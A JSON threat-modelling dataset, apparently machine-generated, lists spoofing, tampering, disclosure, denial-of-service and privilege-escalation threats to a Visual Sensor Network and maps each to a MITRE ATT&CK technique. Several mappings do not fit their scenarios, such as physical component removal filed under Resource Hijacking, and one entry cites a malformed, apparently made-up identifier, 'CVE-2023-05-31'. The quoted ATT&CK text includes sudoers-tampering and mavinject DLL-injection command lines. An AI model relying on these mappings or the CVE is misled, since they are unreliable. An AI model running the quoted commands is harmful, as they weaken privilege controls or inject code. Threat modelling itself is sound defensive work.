                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive visual data from the VSN is exposed publicly due to misconfigured access controls.",
            "Assumptions": [
                {
                    "Assumption": "Access controls are improperly set up.",
                    "Role": "System Admin",
                    "Condition": "Valid if permissions are misconfigured."
                },
                {
                    "Assumption": "No regular review of access control settings.",
                    "Role": "System Admin",
                    "Condition": "Valid if audits are not conducted."
                },
                {
                    "Assumption": "Sensitive data is not segregated.",
                    "Role": "System Admin",
                    "Condition": "Valid if data classification is absent."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive visual data.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Access Control",
                "Data Exposure",
                "Sensitive Data"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A malware infection siphons off visual data and transmits it to an external command and control server.",
            "Assumptions": [
                {
                    "Assumption": "System lacks malware detection mechanisms.",
                    "Role": "System Admin",
                    "Condition": "Valid if there is no anti-malware solution."
                },
                {
                    "Assumption": "Data exfiltration goes undetected.",
                    "Role": "System Admin",
                    "Condition": "Valid if network traffic is not monitored."
                },
                {
                    "Assumption": "System is connected to external networks.",
                    "Role": "System Admin",
                    "Condition": "Valid if system interfaces with outside networks."
                }
            ],
            "Potential Impact": "Loss of data confidentiality due to exfiltration.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Malware",
                "Data Exfiltration",
                "Command and Control"
            ],
            "mitre_technique": {
                "name": "Socket Filters",
                "description": "Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the `libpcap` library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.\n\nTo establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria.(Citation: haking9 libpcap network sniffing) Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with [Protocol Tunneling](https://attack.mitre.org/techniques/T1572).(Citation: exatrack bpf filters passive backdoors)(Citation: Leonardo Turla Penquin May 2020)\n\nFilters can be installed on any Unix-like platform with `libpcap` installed or on Windows hosts using `Winpcap`.  Adversaries may use either `libpcap` with `pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER` options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.",
                "id": "attack-pattern--005cc321-08ce-4d17-b1ea-cb5275926520",
                "technique_id": "T1205.002"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the VSN with excessive traffic, rendering the network components unresponsive.",
            "Assumptions": [
                {
                    "Assumption": "Network traffic is not rate-limited.",
                    "Role": "System Admin",
                    "Condition": "Valid if rate limiting is not configured."
                },
                {
                    "Assumption": "No anomaly detection in place.",
                    "Role": "System Admin",
                    "Condition": "Valid if system cannot detect abnormal traffic patterns."
                },
                {
                    "Assumption": "Attacker can generate high traffic volumes.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker has sufficient resources."
                }
            ],
            "Potential Impact": "Disrupted availability of network services.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "Traffic Flood",
                "Network",
                "Availability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a known vulnerability in the Linux OS of the VSN to crash the system.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerabilities in the Linux OS are unpatched.",
                    "Role": "System Admin",
                    "Condition": "Valid if system is not updated regularly."
                },
                {
                    "Assumption": "Attacker has knowledge of a specific vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Valid if exploits are publicly known."
                },
                {
                    "Assumption": "System lacks adequate monitoring and logging.",
                    "Role": "System Admin",
                    "Condition": "Valid if system health is not tracked."
                }
            ],
            "Potential Impact": "Total system outage affecting data availability.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "Vulnerability Exploit",
                "Linux",
                "System Crash"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An insider removes critical components from the VSN, causing operational failure.",
            "Assumptions": [
                {
                    "Assumption": "Insiders have physical access to hardware.",
                    "Role": "System Admin",
                    "Condition": "Valid if physical security is weak."
                },
                {
                    "Assumption": "System lacks redundancy and failover mechanisms.",
                    "Role": "System Admin",
                    "Condition": "Valid if there's no backup system."
                },
                {
                    "Assumption": "No monitoring of physical access.",
                    "Role": "System Admin",
                    "Condition": "Valid if physical access is not tracked."
                }
            ],
            "Potential Impact": "Localized or total interruption of system operations.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "Insider Threat",
                "Physical Access",
                "Operational Failure"
            ],
            "mitre_technique": {
                "name": "Resource Hijacking",
                "description": "Adversaries may leverage the resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability. \n\nOne common purpose for Resource Hijacking is to validate transactions of cryptocurrency networks and earn virtual currency. Adversaries may consume enough system resources to negatively impact and/or cause affected machines to become unresponsive.(Citation: Kaspersky Lazarus Under The Hood Blog 2017) Servers and cloud-based systems are common targets because of the high potential for available resources, but user endpoint systems may also be compromised and used for Resource Hijacking and cryptocurrency mining.(Citation: CloudSploit - Unused AWS Regions) Containerized environments may also be targeted due to the ease of deployment via exposed APIs and the potential for scaling mining activities by deploying or compromising multiple containers within an environment or cluster.(Citation: Unit 42 Hildegard Malware)(Citation: Trend Micro Exposed Docker APIs)\n\nAdditionally, some cryptocurrency mining malware identify then kill off processes for competing malware to ensure it\u2019s not competing for resources.(Citation: Trend Micro War of Crypto Miners)\n\nAdversaries may also use malware that leverages a system's network bandwidth as part of a botnet in order to facilitate [Network Denial of Service](https://attack.mitre.org/techniques/T1498) campaigns and/or to seed malicious torrents.(Citation: GoBotKR) Alternatively, they may engage in proxyjacking by selling use of the victims' network bandwidth and IP address to proxyware services.(Citation: Sysdig Proxyjacking)",
                "id": "attack-pattern--cd25c1b4-935c-4f0e-ba8d-552f28bc4783",
                "technique_id": "T1496"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A low-privileged user exploits a vulnerability in the VSN's Linux OS to gain root access.",
            "Assumptions": [
                {
                    "Assumption": "System is running an outdated version of Linux.",
                    "Role": "System Admin",
                    "Condition": "Valid if regular updates are not performed."
                },
                {
                    "Assumption": "Low-privileged users have access to high-value targets.",
                    "Role": "System Admin",
                    "Condition": "Valid if user permissions are not properly managed."
                },
                {
                    "Assumption": "No monitoring for privilege escalation attempts.",
                    "Role": "System Admin",
                    "Condition": "Valid if there are no alerts for escalations."
                }
            ],
            "Potential Impact": "Compromised system integrity and security.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Vulnerability Exploit",
                "Linux",
                "Privilege Escalation"
            ],
            "mitre_technique": {
                "name": "Sudo and Sudo Caching",
                "description": "Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.\n\nWithin Linux and MacOS systems, sudo (sometimes referred to as \"superuser do\") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The <code>sudo</code> command \"allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.\"(Citation: sudo man page 2018) Since sudo was made for the system administrator, it has some useful configuration features such as a <code>timestamp_timeout</code>, which is the amount of time in minutes between instances of <code>sudo</code> before it will re-prompt for a password. This is because <code>sudo</code> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a <code>tty_tickets</code> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).\n\nThe sudoers file, <code>/etc/sudoers</code>, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like <code>user1 ALL=(ALL) NOPASSWD: ALL</code>.(Citation: OSX.Dok Malware) Elevated privileges are required to edit this file though.\n\nAdversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, <code>/var/db/sudo</code>'s timestamp can be monitored to see if it falls within the <code>timestamp_timeout</code> range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if <code>tty_tickets</code> is disabled, adversaries can do this from any tty for that user.\n\nIn the wild, malware has disabled <code>tty_tickets</code> to potentially make scripting easier by issuing <code>echo \\'Defaults !tty_tickets\\' >> /etc/sudoers</code>.(Citation: cybereason osx proton) In order for this change to be reflected, the malware also issued <code>killall Terminal</code>. As of macOS Sierra, the sudoers file has <code>tty_tickets</code> enabled by default.",
                "id": "attack-pattern--1365fe3b-0f50-455d-b4da-266ce31c23b0",
                "technique_id": "T1548.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malicious software installed through social engineering allows attackers to gain admin rights on the VSN.",
            "Assumptions": [
                {
                    "Assumption": "Users can install software.",
                    "Role": "System User",
                    "Condition": "Valid if install permissions are not restricted."
                },
                {
                    "Assumption": "Antivirus/anti-malware protections are inadequate.",
                    "Role": "System Admin",
                    "Condition": "Valid if security software is not robust."
                },
                {
                    "Assumption": "Users are not trained to recognize phishing attempts.",
                    "Role": "System User",
                    "Condition": "Valid if security awareness training is insufficient."
                }
            ],
            "Potential Impact": "System compromise through elevated privileges.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Social Engineering",
                "Malware",
                "Privilege Escalation"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a misconfigured service to gain higher privileges within the VSN.",
            "Assumptions": [
                {
                    "Assumption": "Services are running with excessive privileges.",
                    "Role": "System Admin",
                    "Condition": "Valid if principle of least privilege is not enforced."
                },
                {
                    "Assumption": "Service configurations are not regularly audited.",
                    "Role": "System Admin",
                    "Condition": "Valid if service setups are not reviewed."
                },
                {
                    "Assumption": "System lacks defense-in-depth mechanisms.",
                    "Role": "System Admin",
                    "Condition": "Valid if there are no multiple layers of security."
                }
            ],
            "Potential Impact": "Complete misuse of system resources via escalated privileges.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Misconfiguration",
                "Privilege Escalation",
                "Services"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        }
    ]
},
{
    "case_number": "2",
    "batch_number": "19",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a legitimate camera node to gain access to the Visual Sensor Network.",
            "Assumptions": [
                {
                    "Assumption": "The attacker knows or can deduce unique identifiers used by camera nodes.",
                    "Role": "Attacker",
                    "Condition": "Access to network traffic or compromised node information"
                },
                {
                    "Assumption": "No strong mutual authentication between nodes and the central system.",
                    "Role": "System Designer",
                    "Condition": "Weak or no node-level authentication implemented"
                },
                {
                    "Assumption": "Attacker has a device capable of sending and receiving data within the network's range.",
                    "Role": "Attacker",
                    "Condition": "Proximity to the network"
                }
            ],
            "Potential Impact": "Unauthorized access to network, potential data exfiltration, and VSN disruption.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "device",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a fake authentication server to intercept credentials from camera nodes.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has the capability to replicate the authentication server's network endpoint.",
                    "Role": "Attacker",
                    "Condition": "Access to network configuration details"
                },
                {
                    "Assumption": "Camera nodes are set to trust any responding authentication server.",
                    "Role": "System Designer",
                    "Condition": "Misconfigured trust settings"
                },
                {
                    "Assumption": "The attacker operates within the same subnet or broadcast domain.",
                    "Role": "Attacker",
                    "Condition": "Network proximity"
                }
            ],
            "Potential Impact": "Compromised node credentials, potential unauthorized access, and data exfiltration.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credentials",
                "network endpoints",
                "man-in-the-middle"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker captures traffic to identify and reuse session tokens from camera nodes.",
            "Assumptions": [
                {
                    "Assumption": "Session tokens are transmitted in plaintext or weakly encrypted.",
                    "Role": "System Designer",
                    "Condition": "Lack of strong encryption for session tokens"
                },
                {
                    "Assumption": "Attacker can capture network traffic between nodes and authentication server.",
                    "Role": "Attacker",
                    "Condition": "Access to network communication pathway"
                },
                {
                    "Assumption": "Session tokens are valid for an extended period or are not tied to specific sessions.",
                    "Role": "System Designer",
                    "Condition": "Weak session management"
                }
            ],
            "Potential Impact": "Unauthorized session hijacking, data interception, and potential control over nodes.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "session hijacking",
                "traffic capture",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies transmitted visual data to compromise the integrity of the data.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted without sufficient encryption or integrity checks.",
                    "Role": "System Designer",
                    "Condition": "Unencrypted communication channels"
                },
                {
                    "Assumption": "The attacker has access to the network traffic between camera nodes.",
                    "Role": "Attacker",
                    "Condition": "Network proximity"
                },
                {
                    "Assumption": "No validation mechanism exists to verify data integrity upon receipt.",
                    "Role": "System Designer",
                    "Condition": "Lack of secure checksum or hash validation"
                }
            ],
            "Potential Impact": "Corruption of visual data, misleading information, and potential failure in visual-based decisions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data integrity",
                "network",
                "visual data"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker exploits CVE-2023-05-31 to execute arbitrary OS commands on the IoT application.",
            "Assumptions": [
                {
                    "Assumption": "Application is using a vulnerable version of the software.",
                    "Role": "System Operator",
                    "Condition": "Outdated or unpatched systems"
                },
                {
                    "Assumption": "The attacker has knowledge of the specific exploit.",
                    "Role": "Attacker",
                    "Condition": "Access to exploit details"
                },
                {
                    "Assumption": "No mitigations such as application whitelisting or anomaly detection are in place.",
                    "Role": "System Designer",
                    "Condition": "Lack of proactive security measures"
                }
            ],
            "Potential Impact": "Full system control, potential malicious operations such as data tampering or service disruption.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "code execution",
                "os commands",
                "vulnerability"
            ],
            "mitre_technique": {
                "name": "Mavinject",
                "description": "Adversaries may abuse mavinject.exe to proxy execution of malicious code. Mavinject.exe is the Microsoft Application Virtualization Injector, a Windows utility that can inject code into external processes as part of Microsoft Application Virtualization (App-V).(Citation: LOLBAS Mavinject)\n\nAdversaries may abuse mavinject.exe to inject malicious DLLs into running processes (i.e. [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001)), allowing for arbitrary code execution (ex. <code>C:\\Windows\\system32\\mavinject.exe PID /INJECTRUNNING PATH_DLL</code>).(Citation: ATT Lazarus TTP Evolution)(Citation: Reaqta Mavinject) Since mavinject.exe may be digitally signed by Microsoft, proxying execution via this method may evade detection by security products because the execution is masked under a legitimate process. \n\nIn addition to [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001), Mavinject.exe can also be abused to perform import descriptor injection via its  <code>/HMODULE</code> command-line parameter (ex. <code>mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER</code>). This command would inject an import table entry consisting of the specified DLL into the module at the given base address.(Citation: Mavinject Functionality Deconstructed)",
                "id": "attack-pattern--1bae753e-8e52-4055-a66d-2ead90303ca9",
                "technique_id": "T1218.013"
            }
